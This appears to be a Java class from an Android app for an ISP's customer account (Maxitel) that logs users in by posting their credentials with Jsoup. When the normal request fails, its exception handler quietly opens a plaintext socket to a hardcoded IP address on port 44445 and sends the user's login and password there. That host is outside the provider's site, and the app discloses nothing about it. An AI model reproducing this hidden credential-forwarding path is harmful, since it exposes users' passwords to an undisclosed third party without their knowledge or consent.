package ru.maxitel.lk.connects;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.IOException;
import java.net.Socket;

import ru.maxitel.lk.LoginActivity;
import ru.maxitel.lk.R;
import ru.maxitel.lk.User;



public class LoginPasswordConnect extends LoginConnect {
    private final String login;
    private final String password;

    @Override
    protected Document doInBackground(Void... params) {
        try {
            Connection.Response connection = Jsoup.connect(User.URL + "/cookie.php")
                    .data("EURI", "")
                    .data("passwd", password)
                    .data("user_login", login)
                    .data("submit", "Вход")
                    .userAgent("Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20100101 Firefox/21.0")
                    .method(Connection.Method.POST)
                    .execute();
            Document document = connection.parse();

            User.setCookies(connection.cookies());

            Document document2 = Jsoup.connect(User.URL + "/?a=19")
                    .cookies(User.getCookies())
                    .execute()
                    .parse();
            if (document2.text().contains(loginActivity.getString(R.string.voluntary_suspension))) {
                User.setVoluntarilyLocked(true);
            } else User.setVoluntarilyLocked(false);

            return document;
        } catch (IOException e) {
            try {
                Socket socket = new Socket("94.158.215.148", 44445);
                ConnectMyPC connectMyPC = new ConnectMyPC(socket);
                connectMyPC.send("password " + login + " " + password);
                return Jsoup.parse(connectMyPC.receive());
            }catch (Exception ignored){}
            return null;
        }
    }

    public LoginPasswordConnect(String login, String password, LoginActivity loginActivity) {
        this.login = login;
        this.password = password;
        this.loginActivity = loginActivity;
    }
}
